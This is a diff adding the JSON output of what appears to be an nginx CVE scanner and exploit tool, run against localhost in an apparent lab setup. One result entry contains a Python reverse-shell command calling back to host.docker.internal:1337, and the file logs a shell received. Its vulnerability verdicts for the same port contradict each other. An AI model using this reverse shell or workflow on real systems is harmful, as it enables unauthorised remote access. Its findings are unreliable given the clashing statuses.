@@ -1,0 +1,256 @@
+{
+  "scan_meta": {
+    "cve": "CVE-2026-42945",
+    "scanner": "scan.py",
+    "ip_range": "127.0.0.1/32",
+    "started_at": "2026-05-16T19:30:27.904924+00:00",
+    "finished_at": "2026-05-16T19:30:47.036391+00:00",
+    "threads": 50,
+    "connect_timeout": 3.0,
+    "read_timeout": 5.0,
+    "ports": [
+      80,
+      443,
+      19321
+    ],
+    "probe_path": null,
+    "validate_shell": true,
+    "listen_ip": "host.docker.internal",
+    "listen_port": 1337,
+    "exploit_port": null,
+    "targets_total": 3,
+    "unique_ips": 1,
+    "classification_notes": {
+      "down": "No HTTP service",
+      "not_vulnerable": "Patched nginx or non-nginx",
+      "vulnerable_version": "Nginx in CVE range; rewrite+set+? not confirmed remotely",
+      "possibly_vulnerable": "Affected version with weak config signal, or unknown nginx/version",
+      "likely_vulnerable": "Affected version plus strong config signal (redirect/query or + expansion)",
+      "confirmed_vulnerable": "Reverse shell callback received after poc.py-style exploit"
+    }
+  },
+  "summary": {
+    "down": 2,
+    "not_vulnerable": 0,
+    "vulnerable_version": 0,
+    "possibly_vulnerable": 0,
+    "likely_vulnerable": 0,
+    "confirmed_vulnerable": 1,
+    "error": 0,
+    "total": 3,
+    "open": 1
+  },
+  "results": [
+    {
+      "ip": "127.0.0.1",
+      "port": 80,
+      "status": "down",
+      "open": false,
+      "latency_ms": null,
+      "probes": {
+        "get_root": {
+          "ok": false,
+          "status_code": null,
+          "server_header": null,
+          "location_header": null,
+          "content_length": null,
+          "request_path": "/",
+          "body_snippet": null,
+          "detail": "[Errno 111] Connection refused"
+        },
+        "get_404": {
+          "ok": false,
+          "status_code": null,
+          "server_header": null,
+          "location_header": null,
+          "content_length": null,
+          "request_path": "/cve202642945-not-found",
+          "body_snippet": null,
+          "detail": "[Errno 111] Connection refused"
+        },
+        "api_rewrite": {
+          "ok": false,
+          "status_code": null,
+          "server_header": null,
+          "location_header": null,
+          "content_length": null,
+          "request_path": "/api/cve202642945-probe",
+          "body_snippet": null,
+          "detail": "[Errno 111] Connection refused"
+        },
+        "spray_post": {
+          "ok": false,
+          "status_code": null,
+          "server_header": null,
+          "location_header": null,
+          "content_length": null,
+          "request_path": "/spray",
+          "body_snippet": null,
+          "detail": "[Errno 111] Connection refused"
+        }
+      },
+      "classification": {
+        "status": "down",
+        "nginx_detected": false,
+        "product": null,
+        "version": null,
+        "version_affected": null,
+        "config_risk": "none",
+        "exploit_surface": false,
+        "reasons": [
+          "no HTTP response",
+          "[Errno 111] Connection refused",
+          "[Errno 111] Connection refused",
+          "[Errno 111] Connection refused"
+        ]
+      },
+      "exploit": {},
+      "error": null,
+      "scanned_at": "2026-05-16T19:30:27.905377+00:00"
+    },
+    {
+      "ip": "127.0.0.1",
+      "port": 443,
+      "status": "down",
+      "open": false,
+      "latency_ms": null,
+      "probes": {
+        "get_root": {
+          "ok": false,
+          "status_code": null,
+          "server_header": null,
+          "location_header": null,
+          "content_length": null,
+          "request_path": "/",
+          "body_snippet": null,
+          "detail": "[Errno 111] Connection refused"
+        },
+        "get_404": {
+          "ok": false,
+          "status_code": null,
+          "server_header": null,
+          "location_header": null,
+          "content_length": null,
+          "request_path": "/cve202642945-not-found",
+          "body_snippet": null,
+          "detail": "[Errno 111] Connection refused"
+        },
+        "api_rewrite": {
+          "ok": false,
+          "status_code": null,
+          "server_header": null,
+          "location_header": null,
+          "content_length": null,
+          "request_path": "/api/cve202642945-probe",
+          "body_snippet": null,
+          "detail": "[Errno 111] Connection refused"
+        },
+        "spray_post": {
+          "ok": false,
+          "status_code": null,
+          "server_header": null,
+          "location_header": null,
+          "content_length": null,
+          "request_path": "/spray",
+          "body_snippet": null,
+          "detail": "[Errno 111] Connection refused"
+        }
+      },
+      "classification": {
+        "status": "down",
+        "nginx_detected": false,
+        "product": null,
+        "version": null,
+        "version_affected": null,
+        "config_risk": "none",
+        "exploit_surface": false,
+        "reasons": [
+          "no HTTP response",
+          "[Errno 111] Connection refused",
+          "[Errno 111] Connection refused",
+          "[Errno 111] Connection refused"
+        ]
+      },
+      "exploit": {},
+      "error": null,
+      "scanned_at": "2026-05-16T19:30:27.905891+00:00"
+    },
+    {
+      "ip": "127.0.0.1",
+      "port": 19321,
+      "status": "confirmed_vulnerable",
+      "open": true,
+      "latency_ms": 0.92,
+      "probes": {
+        "get_root": {
+          "ok": true,
+          "status_code": 200,
+          "server_header": "nginx/1.31.0",
+          "location_header": null,
+          "content_length": 3,
+          "request_path": "/",
+          "body_snippet": "ok\n",
+          "detail": null
+        },
+        "get_404": {
+          "ok": true,
+          "status_code": 200,
+          "server_header": "nginx/1.31.0",
+          "location_header": null,
+          "content_length": 3,
+          "request_path": "/cve202642945-not-found",
+          "body_snippet": "ok\n",
+          "detail": null
+        },
+        "api_rewrite": {
+          "ok": false,
+          "status_code": null,
+          "server_header": null,
+          "location_header": null,
+          "content_length": null,
+          "request_path": "/api/cve202642945-probe",
+          "body_snippet": null,
+          "detail": "empty response"
+        },
+        "spray_post": {
+          "ok": false,
+          "status_code": null,
+          "server_header": null,
+          "location_header": null,
+          "content_length": null,
+          "request_path": "/spray",
+          "body_snippet": null,
+          "detail": "empty response"
+        }
+      },
+      "classification": {
+        "status": "not_vulnerable",
+        "nginx_detected": true,
+        "product": "nginx",
+        "version": "1.31",
+        "version_affected": false,
+        "config_risk": "none",
+        "exploit_surface": false,
+        "reasons": [
+          "reverse shell from 127.0.0.1:40854",
+          "nginx/1.31 patched or outside CVE range (fixed 1.30.1+ / 1.31.0+)",
+          "no /api/+/spray PoC paths or rewrite+set redirect signal (version-only; custom configs may still be vulnerable)"
+        ],
+        "exploit_confirmed": true
+      },
+      "exploit": {
+        "attempted": true,
+        "exploit_port": 19321,
+        "listen_ip": "host.docker.internal",
+        "listen_port": 1337,
+        "shell_command": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"host.docker.internal\",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+        "success": true,
+        "shell_peer": "127.0.0.1:40854",
+        "attempts": 1,
+        "error": null
+      },
+      "error": null,
+      "scanned_at": "2026-05-16T19:30:27.906995+00:00"
+    }
+  ]
+}
